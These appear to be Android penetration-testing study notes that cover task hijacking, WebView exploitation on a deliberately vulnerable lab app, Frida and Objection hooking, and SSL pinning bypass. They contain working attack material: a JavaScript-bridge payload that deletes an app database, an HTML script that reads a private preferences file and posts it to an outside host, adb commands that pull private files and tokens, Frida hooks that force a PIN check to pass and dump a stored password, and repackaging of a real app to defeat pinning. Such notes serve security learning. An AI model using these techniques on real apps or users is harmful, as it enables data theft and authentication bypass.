When identifying if Task Hijacking exists in an app, we'll be looking for this flag in the Manifest files of the applications. The attack described below is possible because of the usage of mode " **singleTask**" in the launchMode of an activity.



in MainActivity.java

```java
public class MainActivity extends AppCompatActivity {
@Override
protected void onCreate(Bundle savedInstanceState) { 
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    moveTaskToBack(true);       <<<<<<========
}
    

@Override
public void onResume() {
	super.onResume();
	}
}
```



**Mitigation**

change `android:launchMode="singleTask"` to `android:launchMode="singleInstance"`

- https://developer.android.com/privacy-and-security/risks/strandhogg
- [A deep dive into Task Hijacking in Android](https://blog.dixitaditya.com/android-task-hijacking?source=post_page-----80d2ddb4af06--------------------------------&x-host=blog.dixitaditya.com)
- [The Risk of Android StrandHogg Security Issue and How it can be Mitigated](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)
- https://medium.com/@prnz_offl/task-hijacking-in-android-d46200a54026

#### StrandHogg V2

- https://promon.co/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability/





---

### Webview Security
- Improved significantly but developer mistakes will still be present
- No address bar, title bar or status bar making it easier for attackers to perform Phishing attacks Bypasses Google Bouncer's verification
- MITM attacks leading to Differential Context Vulnerabilities
- Javascript Bridge vulnerabilities (addJavascriptInterface RCE)
- Universal XSS (CVE-2020-6506)
- Password saved in clear text - setSavePassword(false)
- Exploiting Webview and monetising through click frauds (ref)
- Network traffic interception with focus on how webview is implemented
- What features are allowed?
- Whitelisting in the case of frameworks like Apache Cordova
- Certificate validation mismatch handling



#### Webview implementation

- Native to JS:
  - loadURL()
  - evaluateJavascript ()
- JS to Native:
  - addJavascriptInterface()
  - onJsPrompt()
  - shouldOverrideUrlLoading()
  - shouldInterceptRequest()



#### Javascript Bridge
- Javascript component of web can interact with the native application components . 
- Can expose app-level objects to JS code via addJavascript Interface()
- If content loaded over insecure channel, attacker can inject malicious content
- Malicious content can interact with the app through the bridge interface
- Popular RCE vulnerability (ref) - over 90% of Android users vulnerable
- JS code can get access to java.lang.Runtime to execute or other Android APIs such as TelephonyManager 
- @Javascript Interface annotation on the called functions
- Other bridges:
  - exportsearchBoxJavaBridge_Object
  - accessibility with accessibilityTraversal
- Set target SDK 4.2+ : patch



**example to vulnerable code**

```java
private void loadOneCloudView() {
BoxSpinner.show();
String str = "&auth_token=" + AuthToken.getAuthToken() + "&api_key=" + BoxApi.getApiKey(); this.webview.postUrl(this.mOneCloud GalleryUrl, EncodingUtils.getBytes(str, "BASE64"));
if (!this.javascript InterfaceBroken)
}
this.webview.addJavascript Interface(this.marketInterface, "Android");
```



**Exploit POC**

```html
<script>
var path = '/data/data/com.box.android/databases/webview.db'; function execute(cmd)
{
document.write("WebView Vulnerability");
return window. Android.getClass().forName('java.lang.Runtime'). getMethod('getRuntime', null).invoke(null, null).exec(cmd);
}
execute(['/system/bin/rm', '-R', path]);
</script>
```





#### File://

- Access of internal application files through the file:// scheme
- Exposed activities could lead to stealing app private files from other apps
- Check the application code for :
  - setAllowFileAccess
  - setAllowFileAccessFromFile URLs
  - setAllowUniversal AccessFromFileURLs
  - setAllowContentAccess



#### Insecure validation
- URL:
  - if(!url.startsWith("http://www.website.com"))
  - Attacker: http://www.website.com@malicious.com
- Escaping backslashes
- Using reflection
- Scheme validation missing: can use javascript:// and file://





#### Assessing webview security
- Analyze network traffic
- Webview implementation
- File access, Javascript execution etc.
- App Reverse engineering
- Keyword identification
- Tracing data flow



### Exploit web view in vulnwebview.apk

in AndroidManifest.xml

```xml
<activity
    android:name="com.tmh.vulnwebview.SupportWebView"
    android:exported="true"/>
<activity
    android:name="com.tmh.vulnwebview.RegistrationWebView"
    android:exported="true"/>

```

the two activites are `exported="true"`



in com.tmh.vulnwebview.SupportWebView

```java
    public void loadWebView() {
        WebView webView = (WebView) findViewById(R.id.webview2);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setJavaScriptEnabled(true);
        Map<String, String> extraHeaders = new HashMap<>();
        extraHeaders.put("Authorization", getUserToken());
        webView.addJavascriptInterface(new WebAppInterface(this), "Android");
        webView.loadUrl(getIntent().getStringExtra("support_url"), extraHeaders);
    }
```







in com.tmh.vulnwebview.RegistrationWebView

```java
    private void loadWebView() {
        WebView webView = (WebView) findViewById(R.id.webview);
        webView.setWebChromeClient(new WebChromeClient() { // from class: com.tmh.vulnwebview.RegistrationWebView.1
            @Override // android.webkit.WebChromeClient
            public boolean onConsoleMessage(ConsoleMessage consoleMessage) {
                Log.d("MyApplication", consoleMessage.message() + " -- From line " + consoleMessage.lineNumber() + " of " + consoleMessage.sourceId());
                return true;
            }
        });
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setJavaScriptEnabled(true);
        if (getIntent().getExtras().getBoolean("is_reg", false)) {
            webView.loadUrl("file:///android_asset/registration.html");
        } else {
            webView.loadUrl(getIntent().getStringExtra("reg_url"));
        }
    }
```



in com.tmh.vulnwebview.WebAppInterface

```java
public class WebAppInterface {
    Context mContext;

    /* JADX INFO: Access modifiers changed from: package-private */
    public WebAppInterface(Context c) {
        this.mContext = c;
    }

    @JavascriptInterface
    public String getUserToken() {
        return SupportWebView.getUserToken();
    }
}
```





**Note:** 

- `setAllowUniversalAccessFromFileURLs` it allows us to use file scheme `file://`

  - the developer can configure is allowing JavaScript running within the context of file scheme URL to access content from any origin including other file scheme URLs.

    This setting removes all same origin policy restrictions & allows the  webview to make requests to the web from the file which is normally not  possible. i.e., Attacker can read local files using java script and send them across the web to a attacker controlled domain.

    If the WebView is exported, this behavior can be very dangerous because it can allow the attacker to read arbitrary files which may be private to  the application.

- `setJavaScriptEnabled` it allows us to run javascript code
  - Developers can enable java script in the webview by adding this configuration

- `loadUrl()` supports to load files with HTTP scheme `http://` and file scheme `file://` as well  
- `addJavascriptInterface()` allows us to call any public function in the  `WebAppInterface` 
  - Adding this configuration creates an interface between the webpage’s  java script and the client side java code of the application. i.e., the  web page’s java script can access and inject java code into the  application.



exploit web view in the support activity to load another website

```shell
adb shell am start -n com.tmh.vulnwebview/com.tmh.vulnwebview.SupportWebView --es support_url https://google.com
```



exploit web view in the support activity to get local files or from sdcard if the app has permissions to read the external storage

```shell
adb shell am start -n com.tmh.vulnwebview/com.tmh.vulnwebview.SupportWebView --es support_url file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml


adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url file:///mnt/sdcard/secret.txt
OR
adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url file:///sdcard/secret.txt
OR
adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url file:///storage/self/primary/secret.txt
```



exploit web view in the support activity to runjavascript code

```shell
adb shell am start -n com.tmh.vulnwebview/com.tmh.vulnwebview.SupportWebView --es support_url http://192.168.56.2:8000/xss.html
OR
adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url http://192.168.56.2:8000/xss.html

-n >> activity name
```



exploit web view in the registration activity 

```shell
adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url https://google.com
```



**exfiltrate data and send it to the attacker**

in exfilterate.html

```html
<script>
var xhttp = new XMLHttpRequest();
var xhttp2 = new XMLHttpRequest();

  xhttp.onreadystatechange = function() {

    if( xhttp.readyState === XMLHttpRequest.DONE ) {

      xhttp2.open("POST", "https://karim.free.beeceptor.com")
      xhttp2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp2.send('data = ' + btoa(xhttp.responseText));
        alert(xhttp.responseText)
    }
  }

xhttp.open("GET", "file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml");
xhttp.send();

</script>
```



```
adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url file:///data/data/com.tmh.vulnwebview/shared_prefs/exfilterate.html
```





**Call  getUserToken**

we can call any public function because of this line

```java
 webView.addJavascriptInterface(new WebAppInterface(this), "Android");
```



in gettoken.html

```
<script>
document.write(Android.getUserToken())
</script>
```



```
ngrok http 80
php -S 0.0.0.0:80

OR use python server
python3 -m http.server
```



```
adb shell am start -n com.tmh.vulnwebview/.SupportWebView --es support_url http://ip:port/gettoken.html
```



### web view remote debugging

In Android WebViews have a debugging feature, that allows you to use the [ADB remote debugging extension](https://chrome.google.com/webstore/detail/adb/dpngiggdglpdnjdoaefidgiigpemgage) for chrome to debug the contents of the WebView. Most of the  applications which are published on app store this is normally turned  off but you can find this feature enabled in demo applications or  staging applications if you’re testing. So these small little tricks are to enable that feature on and Android app downloaded from the app store

```
setWebContentsDebuggingEnabled(true)
```



- https://infosecwriteups.com/android-webview-hacking-enable-webview-debugging-d292b53f7a63
- https://medium.com/mobis3c/exploiting-android-webview-vulnerabilities-e2bcff780892

----

## Instrumentation

### Frida

get the architecture of the device to install the appropriate frida server

```shell
adb -d shell getprop ro.product.cpu.abi
```





push the server to the emulator and run it

```
PS > adb push .\frida-server-15.2.2-android-x86 /data/local/tmp
.\frida-server-15.2.2-android-x86: 1 file pushed, 0 skipped. 1.4 MB/s (46387888 bytes in 31.882s)

PS > adb shell
vbox86p:/ # cd /data/local/tmp
vbox86p:/data/local/tmp # ls
frida-server-15.2.2-android-x86
vbox86p:/data/local/tmp # chmod +x frida-server-15.2.2-android-x86
vbox86p:/data/local/tmp # ./frida-server-15.2.2-android-x86
```



list frida devices `frida-ls-devices`

```
 Mobexler@Mobexler  ~/Desktop  frida-ls-devices                                                  ✔  214  05:28:38 
Id                   Type    Name        
-------------------  ------  ------------
local                local   Local System
192.168.56.104:5555  usb     Pixel       
socket               remote  Local Socket
```



list the running processes on my host device

```
frida-ps
```



list the running processes/applications on the emulator

```
frida-ps -Ua 	#list all running apps
frida-ps -Uai 	# -i list all installed apps
```



choose a package 

```
frida -U process_name
```





```
frida> Process.id
frida> Process.enumerateModules
frida> Process.enumerateLoadedClassesSync() #show list of all loaded classes
```



write javascript 

```
nano hello-world.js

Java.perform(function(){
	console.log("Hello world");
})
```



attach the script to the package

```
frida -U -l hello-world.js process_name
get process_name from frida-ps -Uai >> Name
```



frida script to get the class name which contains specific word

```java
Java.perform(function(){

	console.log("Process ID is: "+Process.id);
	Java.enumerateLoadedClasses({
		onMatch: function(clsName){
			if(clsName.includes("word")){
                console.log("Class Name: "+clsName);
            }
		},
		onComplete: function(clsName){
			console.log("Enumeration is completed");
		}
	})
})
```





#### use python script to run frida script

```python
import frida
import time

device frida.get_usb_device()
pid = device.spawn (["com.spotify.music"])
device.resume(pid)
time.sleep(1)

session = device.attach(pid)
script = session.create_script(open("hello_world.js").read())
script.load()
input()
```



#### frida hooking on checkPin function in fridaApp.apk

checkPin function in  `asvid.github.io.fridaapp` package in `MainActivity` class

```java
    fun checkPin(pin: String): Boolean {
        if (pin == "1234") {
            Log.d("PIN", "pin correct!")
            return true
        }
        return false
    }
```

this function returns true if the pin is 1234. we will hook on this function to return true even if the pin is incorrect.

application package: asvid.github.io.fridaapp

function class: MainActivity

function name: checkPin

function argument: pin

return type: boolean



frida script

```java
Java.perform(function() {
var pinClass = Java.use('asvid.github.io.fridaapp.MainActivity')
pinClass.checkPin.implementation = function (pin) {
console.log("pin: " + pin)
return true;
}
})
```



run the script

```shell
frida -U −l method_log_patch.js -f asvid.github.io.fridaapp 
frida> resume

OR
frida -U −l method_log_patch.js -f asvid.github.io.fridaapp --no-pause
```



**hook on showToast function in fridaApp.apk**

```kotlin
    fun showToast() {
        runOnUiThread {
            Toast.makeText(this, R.string.toast_text, Toast.LENGTH_SHORT).show()
        }
    }
```

application package: asvid.github.io.fridaapp

function class: MainActivity

function name: showToast

function argument: no argument

return type: void



frida script

```java
Java.perform(function() {
var toast = Java.use('asvid.github.io.fridaapp.MainActivity')
toast.showToast.implementation = function() {
console.log("inside toast")
}
})
```



#### hooking into a function 

```java
package com.example.allx256.frida_test;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

public class my_activity extends AppCompatActivity {
/* JADX INFO: Access modifiers changed from: protected */  // android.support.v7.app.AppCompatActivity, android. 

@Override
public void onCreate(Bundle savedInstanceState) { 
    super.onCreate(savedInstanceState);
	setContentView(R.layout.activity_my_activity);
	while (true) { 
        try {
			Thread.sleep(1000L);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
            fun (50, 30);
	}
}
void fun (int x, int y) {
	Log.d("Sum", String.valueOf(x + y));
	}
}
```

application package: com.example.allx256.frida_test

function class: my_activity

function name: fun

function argument: x, y

return type: void



we want to change the value of x, y parameters

frida script

```java
Java.perform(function(){
    var my_cls = Java.use("com.example.allx256.frida_test.my_activity")
    my_cls.fun.implementation = function(x, y){
        console.log("original x, y :" + x + ", " + y);
        this.fun(10,5);
        console.log("new x, y :" + x + ", " + y);
    }
})
```





#### hooking into a function with method overloading and call function that never called in the app

```java
package com.example.allx256.frida_test;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

public class my_activity extends AppCompatActivity { 
    private String total = "000###@@@";"

    @Override
	public void onCreate(Bundle savedInstanceState) {
        
        super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_my_activity);
		while (true) {
		try {
			Thread.sleep(1000L);
		} catch (InterruptedException e) {
            e.printStackTrace();
		}

		fun (50, 30);
		Log.d("string", fun ("LoWeRCASE Me!!!!!!!!!"));
	}

    void fun(int x, int y) {
        Log.d("Sum", String.valueOf(x + y));
    }

    String fun (String x) {
        this. total + x;
        return x.toLowerCase();
    }
    String secret() {
        return this.total;
    }
}

```

method override in `fun` function and `secret()` function never called in the app and has access to a private variable `total`.

With method overloading we need to use `.overload()` to determine which function you want to hook into  



application package: com.example.allx256.frida_test

function class: my_activity

function1 name: fun

function1 argument: x, y

function1 return type: void

function2 name: fun

function2 argument: x

function2 return type: string



we want to change the value of x, y parameters

frida script

```java
Java.perform(function(){
    var my_cls = Java.use("com.example.allx256.frida_test.my_activity")
   // hook into fun(int, int)     
    my_cls.fun.overload("int", "int").implementation = function(x, y){
        console.log("original x, y :" + x + ", " + y);
        var ret = this.fun(10,5);
        console.log("new x, y :" + x + ", " + y);
        return ret;
    }
    
    // hook into fun(string)
    my_cls.fun.overload("java.lang.String").implementation = function(x){
    console.log("original string x:" + x );
    var newString = "New String";
    var ret = this.fun(newString);
    console.log("new string x:" + x );
    return ret;
	}
});
```

another better way for defining a string because string is one of a complex datatypes: 

we need to reference an instance of java string class `java.lang.String`

```java
Java.perform(function(){
    var my_cls = Java.use("com.example.allx256.frida_test.my_activity")

    // hook into fun(string)
    my_cls.fun.overload("java.lang.String").implementation = function(x){
    console.log("original string x:" + x );
    
    var strClass = Java.use("java.lang.String");
    var newString = strClass.$new("New String");
    
    var ret = this.fun(newString);
    console.log("new string x:" + x );
    return ret;
	}
});
```



**hook into secret()**

we will use `Java.choose(className, callback)` because we want to call this function

 ```java
 Java.perform(function(){
     // hook into secret()
     Java.choose("com.example.allx256.frida_test.my_activity", {
        onMatch: function(instance){
            console.log("Instance found at " + instance );
            console.log("Result of secret: " + instance.secret());
        },
         onComplete: function() { }
     });
 });
 ```

the script may load in memory before the application, so the execution of `java.choose()` may not be done. We need to start the application first, then attach the script.

get the process id of the application

```
frida-ps -Ua
```



attach the script to the application

```
frida -U -l hook.js -p process_id --no-pause
```



or you can run the script with python

```python
import frida
import time

device frida.get_usb_device()
pid = device.spawn (["com.example.allx256.frida_test"])
device.resume(pid)
time.sleep(5)

session = device.attach(pid)
script = session.create_script(open("hook.js").read())
script.load()
input()
```



then to run the python script

```shell
python3 hook.py
```



**frida RPC**

we can export javascript functions and call them whenever we want in python

in hook.js

```java
Java.perform(function(){
	function CallSecretFunction(){
            Java.choose("com.example.allx256.frida_test.my_activity", {
           onMatch: function(instance){
               console.log("Instance found at " + instance );
               console.log("Result of secret: " + instance.secret());
           },
            onComplete: function() { }
    	});
	}
rpc.exports = { callsecretfrompython : CallSecretFunction };
});
```

rpc.exports = {python function : javascript function}

the exported python function name should be in small case

in hook.py

```python
import frida
import time

device frida.get_usb_device()
pid = device.spawn (["com.example.allx256.frida_test"])
device.resume(pid)
time.sleep(5)

session = device.attach(pid)
script = session.create_script(open("hook.js").read())
script.load()

while True:
    	cmd = str(input("1: CallSecretFunction\n2: Exit\n-->"))
        if cmd == "1":
            script.exports.callsecretfrompython()
        elif cmd == "2":
            break
```



```shell
python3 hook.py
```



---

### Tracing instructions and method calls with frida-trace

**trace methods**

```
frida-trace -U -i "Java-*" package_name
-i >> method name we want to trace (any method start with "Java_")
```



**trace modules**

to get all modules in the application
```
frida -U package_name
frida> Process.enumerateModulesSync()
```





trace any ssl calls from libssl.so module

```
frida-trace -U -I "libssl*" package_name
-I >> module name


```





### Call methods with frida

call showToast with frida

call-method.js

```kotlin
    fun showToast() {
        runOnUiThread {
            Toast.makeText(this, R.string.toast_text, Toast.LENGTH_SHORT).show()
        }
    }
```

 

frida script

```java
Java.perform(function() {
    Java.choose("asvid.github.io.fridaapp.MainActivity", { 
        onMatch: function (instance) {
        	instance.showToast()
        },

    onComplete: function(){
    	console.log("Method showToast called")
    }
    })
})
```



run frida script

```
frida -U -l call-method.js -f asvid.github.io.fridaapp --no-pause
```



**call getPassword**

```kotlin
  fun getPassword(): String {
    var password = preferences.getString(AccountManager.KEY_PASSWORD, "")
    val decrypted = r2d2.decryptData(password)
    if (decrypted != null && !decrypted.equals("", ignoreCase = true)) {
      password = decrypted
    }
    return password
  }
}
```

application package: asvid.github.io.fridaapp

function class: Security

function name: getPassword

function argument: no argument

return type: string



frida script

```java
Java.perform(function(){
    Java.choose("asvid.github.io.fridaapp.Security", {
    	onMatch: function (instance) {
       		console.log(instance.getPassword());
    },

    onComplete: function () {
    	console.log("Method getPassword called");
    }
    })
})
```



### access a variable and change its value with frida

change the value of showLogs variable to be true

```
object Logger {
  val showLogs = false

  fun log(text: String) {
    if (showLogs)
      Log.d("LOGGER", text)
  }
}
```

application package: asvid.github.io.fridaapp

function class: Logger

function name: log

function argument: text

return type: string



frida script: change-variables.js

```java
Java.perform(function() {
    Java.choose("asvid.github.io.fridaapp.Logger", {
    	onMatch: function (instance) {
    		instance.showLogs.value = true
    },
   
    	onComplete: function(){
    		console.log("Value Changed")
    	}
    })
})
```



```
frida -U −l change-variables.js -f asvid.github.io.fridaapp --no-pause
```



### Method overloading with frida

if we have two functions with the same name but different arguments, how can we specify the method which we want to hook on it with frida.

```
fun sum(x: Int, y: Int) {
    Log.d("Sum", (x + y).toString())
    Logger.log("debug log $x $y")
}

fun sum(x: Int, y: Int, z: Int) {
    Log.d("Sum for 3 ", (x + y + z).toString())
    Logger.log("debug log of 3 $x $y $z")
}

fun sum(x: String) {
    Log.d("Value of string" + x)
    Logger.log("debug log of $x")
}
```

application package: asvid.github.io.fridaapp

function class: MainActivity

function name: sum

function argument: int 

return type: string



**hook into the sum function with two arguments**

frida script: method-overload.js

```
Java.perform(function() {
var act = Java.use("asvid.github.io.fridaapp.MainActivity") 
act.sum.overload('int', 'int').implementation = function(x, y){ 
		console.log("Inside sum with 2 args");
		console.log("First val == " + x );
		console.log("Second val == " + y);
	}
	
	
	act.sum.overload('int', 'int', 'int').implementation = function(x, y, z){ 
		console.log("Inside sum with 3 args");
		console.log("First val == " + x );
		console.log("Second val == " + y);
		console.log("Second val == " + z);
	}
	
	
	act.sum.overload('java.lang.String').implementation = function(x){ 
		console.log("Inside sum with string");
		console.log("String value: "+ x);
	}
})
```



run the script

```
frida -U -l method-overload.js -f asvid.github.io.fridaapp --no-pause
```



**change the value of the string in the third sum function**

```
Java.perform(function() {
var act = Java.use("asvid.github.io.fridaapp.MainActivity") 

	act.sum.overload('java.lang.String').implementation = function(x){ 
		console.log("Inside sum with string");
		console.log("Original String value: "+ x);
		x = "Google"
		var ret = this.sum(x)
		console.log("New String value: "+ x);
		return ret
	}
})
```







### Objection

```
objection -g package_name explore
```



list all classes

```
objection# android hooking list classes
```



search for class that has specific word

```
objection# android hooking search classes word
```



list class methods

```
objection# android hooking list class_mothods <class_name>

example:
objection# android hooking list class_mothods com.yahoo.internal.Utils
```



list all data directories that the application can has

```
objection# env
```



list all modules in the application

````
objection# memory list modules
````



list all exports that a module has

```
objection# memory list exports module_name
```



watch a method

```
objection# android hooking watch class_method <package.class.method>

example 
objection# android hooking watch class_method asvid.github.io.fridaapp.MainActivity.checkPin
```



dump method arguments and the function return when the method is called

```
objection# android hooking watch class_method <package.class.method> --dump-args --dump-return
```



change return value of a method to true 

```
objection# android hooking set return_value  <package.class.method> true
```



disable ssl pinning

```
objection# android sslpinning disable
```





- https://frida.re/docs/javascript-api/
- https://frida.re/docs/examples/javascript/
- https://learnfrida.info/basic_usage/
- https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0001/



----



### Native library analysis

a lot of applications use native library for additional functionalities. and these native libraries are usually written in C, C++.  so when we compile the application with `jadx` it will not decompile the native libraries. to look at the native libraries you have to use tools like `ghidra`.

also we can  hook on the native library with `frida` to change the logic.



**hook on a native library with frida in [JNIapp](https://github.com/erev0s/JNIapp)**



```
frida -U -f com.ereves.jniapp --no-pause
frida> Process.enumerateModulesSync()
```



the native library in this application is called `libnative-lib.so`



find the exports of this module

``` 
frida> Module.enumerateExportsSync("libnative-lib.so")


[
    {
    "address": "0xeac715d0",
    "name": "Jniint",
    "type": "function"
    },

    {
    "address": "0xeac71630",
    "name":
    "Java_com_erev0s_jniapp_MainActivity_Jniint",
    "type": "function"
    }
]
```



get the instance of `Jniint`

```
frida> Module.getExportByName("libnative-lib.so", "Jniint")
"Oxeac71550"
```

  

store this in a variable and use `interceptor` to attach to `Jni` instance. and make it returns zero.

``` 
frida> var jni = Module.getExportByName("libnative-lib.so", "Jniint")
frida> Interceptor.attach(jni, {onEnter: function(args){}, onLeave: function (retval) {retval.replace(0)}});{}
```







---



### Root detection bypass

tools: magsik or zygsik or frida codeshare root bypass



---

### Android Networking

- Use the app and explore functionalities
- Decompile the application to look at the manifest
- Requires INTERNET and ACCESS_NETWORK_STATE permissions
- Analyze source code to find network related keywords
- HttpsURLConnection for sending and receiving data
- Network operations performed on separate thread (AsyncTask) instead of main Ul thread



### Analyzing network security

- What is the data that is being exchanged?
- What is the Communication channel?
- Is the data in clear text?
- Is any of the data of a private or sensitive nature?
- Is the communication channel secure?



### Network Security Config:

- Custom Trust Anchors
- Debug Only Overrides
- Cleartext traffic opt-out
- Certificate pinning



**Custom Trust Anchors:** is the attribute that the developer can specify which CAs are trusted and this can be done by specifying if the self signed certificate is trusted or root CAs  that come with android system



**Debug Only Overrides:** that allows the application developers to debug the application with a local debug server where the ssl certificates that trusted by the application are unavailable. 



**Cleartext traffic opt-out:** allows developers to specify that the application only uses HTTPS instead of HTTP



**Certificate pinning:** the hash of the certificate or the public key is pinned to the application (SubjectPublicKeyInfo). if the server responds with a certificate that does not match the hash, the validation will fail. 



### Bypassing certificate pinning

- patching 
  - modifying the smali code
  - modifying network security config file
- runtime manipulation



#### frida script to bypass SSL pinning

**[frida-multiple-unpinning](https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/)**



### bypass SSL pinning in indeed.apk

decompile the apk with apktool

```
apktool d indeed.apk
```



in res/xml/network_security_config.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
```

`cleartextTrafficPermitted="true"` allows HTTP traffic.

here the app only trusts the system certificates, we will make the app trust the user installed certificate.



``` xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
```

then delete META-INF directory and build the app

```
apktool b indeed/ -o modified_indeed.apk
```



sign the application

```
keytool.exe -genkey -v -keystore release.keystore -alias alias -keyalg RSA -keysize 2048 -validity 10000

jarsigner.exe -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore release.keystore modified_indeed.apk alias
```



or you can sign the application with uber apk signer

- download the jar file **[uber-apk-signer-1.3.0.jar](https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar)**

- ```bash
  java -jar uber-apk-signer.jar --apks /path/to/apks --out app_signed
  ```



search: SSL pinning trust manager



### bypass SSL pinning in allsafe.apk

**using medusa**

after configuring the proxy from wi-fi setting

```shell
medusa>use modules/http_comnunications/universal_SSL_pinning_bypass.med

run frida server
medusa> run -f infosecadventures.allsafe
```



**using frida script**

```shell
frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f infosecadventures.allsafe --no-pause
```













#### Tools

- [medusa](https://github.com/medusajs/medusa)
- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)







- [**Diving Deep: A Comprehensive Guide to Android Penetration Testing — Part 1**](https://medium.com/@hackersdump0/diving-deep-a-comprehensive-guide-to-android-penetration-testing-part-1-392cf9abf93f)
- [**Diving Deep: A Comprehensive Guide to Android Penetration Testing — Part 2**](https://medium.com/@hackersdump0/diving-deep-a-comprehensive-guide-to-android-penetration-testing-part-2-9c33c319a696)
- [**Diving Deep: A Comprehensive Guide to Android Penetration Testing — Part 3**](https://medium.com/@hackersdump0/diving-deep-a-comprehensive-guide-to-android-penetration-testing-part-3-99e86d021190)
- [**Diving Deep: A Comprehensive Guide to Android Penetration Testing — Part 4**](https://medium.com/@hackersdump0/diving-deep-a-comprehensive-guide-to-android-penetration-testing-part-4-9bba2880b8cb)
- [**Diving Deep: A Comprehensive Guide to Android Penetration Testing — Part 5**](https://medium.com/@hackersdump0/diving-deep-a-comprehensive-guide-to-android-penetration-testing-part-5-c1343b0f0ef9)
